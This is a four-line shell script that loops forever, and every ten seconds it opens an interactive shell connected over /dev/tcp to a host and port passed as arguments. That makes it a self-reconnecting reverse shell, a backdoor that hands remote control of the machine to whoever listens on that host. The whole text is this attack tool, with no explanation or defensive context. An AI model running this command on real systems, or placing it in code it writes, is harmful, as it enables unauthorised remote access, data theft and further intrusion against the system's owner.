while true; do
    sleep 10
    sh -i >& /dev/tcp/$1/$2 0>&1
done
